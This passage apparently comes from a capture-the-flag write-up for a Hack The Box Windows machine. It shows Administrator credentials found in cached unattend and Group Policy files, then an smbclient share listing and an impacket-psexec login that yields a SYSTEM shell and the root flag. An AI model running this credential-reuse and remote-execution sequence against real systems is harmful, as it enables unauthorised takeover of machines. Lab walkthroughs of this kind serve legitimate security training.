UnattendPath : C:\Windows\Panther\Unattend.xml 📌
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator} 🔑
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!} 🔑
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

After the script runs it finds credentials `Administrator`:`MyUnclesAreMarioAndLuigi!!1!` in the cached Group Policy Preference file.

</🔄 Alternative Step>

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

Using the credentials, we can now login as the local Administrator via `psexec`.

`smbclient --user='Administrator/htb.local%MyUnclesAreMarioAndLuigi!!1!' -L 10.10.10.125`:
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
SMB1 disabled -- no workgroup available
```

`impacket-psexec 'Administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.125.....
[*] Found writable share ADMIN$
[*] Uploading file qspGBdcH.exe
[*] Opening SVCManager on 10.10.10.125.....
[*] Creating service jDvE on 10.10.10.125.....
[*] Starting service jDvE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

![Victim: system](https://custom-icon-badges.demolab.com/badge/Victim-system-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
nt authority\system
```

`cd C:\\Users\Administrator\Desktop`

`dir`:
```
 Volume in drive C has no label.
 Volume Serial Number is 35CB-DA81

 Directory of C:\Users\Administrator\Desktop

01/29/2019  12:04 AM    <DIR>          .
01/29/2019  12:04 AM    <DIR>          ..
11/19/2024  10:01 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,482,337,280 bytes free
```

`type root.txt`:
```
89c7a*************************** 🚩
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
